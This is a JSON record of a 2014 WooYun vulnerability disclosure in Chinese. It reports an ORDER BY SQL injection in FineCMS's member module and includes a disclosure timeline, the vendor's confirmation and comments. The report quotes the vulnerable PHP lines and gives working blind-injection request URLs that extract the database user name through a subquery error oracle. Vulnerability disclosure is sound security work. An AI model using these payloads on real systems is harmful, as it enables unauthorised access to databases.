{"id": 50061, "wybug_id": "wooyun-2014-079053", "wybug_title": "Finecms一处代码引发多处SQL注入(Order by注入技巧)", "wybug_corp": "dayrui.com", "wybug_author": "phith0n", "wybug_date": "2014-10-16 16:03", "wybug_open_date": "2015-01-14 16:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向公众公开  简要描述： 做开发的时候发现的。与finecms的斗争永无止境~ 详细说明：  说一下位置：/dayrui/core/D_Member_Home.php 81行：\n$order = isset($_GET['order']) && strpos($_GET['order'], \"undefined\") !== 0 ? $this->input->get('order', TRUE) : 'updatetime desc';\n再下来的109行：\n$this->link->order_by($order);\n首先从$_GET里获得了order并直接放入order by语句中，造成SQL注入。因为有多个类继承了这个类，所以此处SQL注射造成多处功能中枪，包括finecms各个子功能。   漏洞证明：  举个例子，拿news来说。首先修改/dayrui/core/D_Common.php 304行：\nif ($this->member['adminid'] || IS_ADMIN || 1) {    $this->db->db_debug = $this->site[SITE_ID]->db_debug = TRUE;} else {    $this->db->db_debug = $this->site[SITE_ID]->db_debug = FALSE;}\n在IS_ADMIN后面或了一个1，将数据库debug开启。这时候，访问http://xxxx/member/index.php?s=news&c=home&kw=&order=aaaa'即可看到报错：\n\n但既然默认是不会报错的，那么order by 后面除了延时注入，还有什么别的注入方法？在CI的AR中，一旦数据库语句运行出错，其后跟随的result()或result_array()函数就会抛出一个致命错误：Call to a member function result_array() on a non-object，导致php不能继续执行。所以，即使error_reporting(0)，或不开启php报错，我们也可以通过观察页面是否执行完全来判断SQL语句是否执行成功。所以，给予了我们盲注的条件：出错和正确的显示的页面不同。废话说了一大堆，直接给利用方法吧：\n出错：http://xxx/member/index.php?s=news&c=home&kw=&order=(select 1 from information_schema.tables where ord(mid(user() from 1 for 1))>113)正确：http://xxx/member/index.php?s=news&c=home&kw=&order=(select 1 from information_schema.tables where ord(mid(user() from 1 for 1))>114)\n以上方法构造了一个出错的SQL语句，通过子查询返回结果条数来出错。若子查询返回条数大于1，则会爆“Subquery returns more than 1 row”错误。所以，当ord('r')>113的时候，where语句真，select出来多条结果，造成SQL语句报错，进而导致php出现Fatal error。当ord('r')>114的时候，where语句假，select出来0条结果，不会报错。\n\n\n\n   修复方案：  不知道。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-10-16 16:09 厂商回复： 8 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-16 16:12 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  秒确认    \n     2014-10-16 16:27 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  换人了？？    \n     2014-10-24 01:33 |    \t\t帕秋莉 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 私はあなたを杀す wwwwww)\t\t \n  @phith0n 这就是你说的几十块钱源码论坛号赚了几千的那个厂商么..看了前面的打脸 简直笑哭了..    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}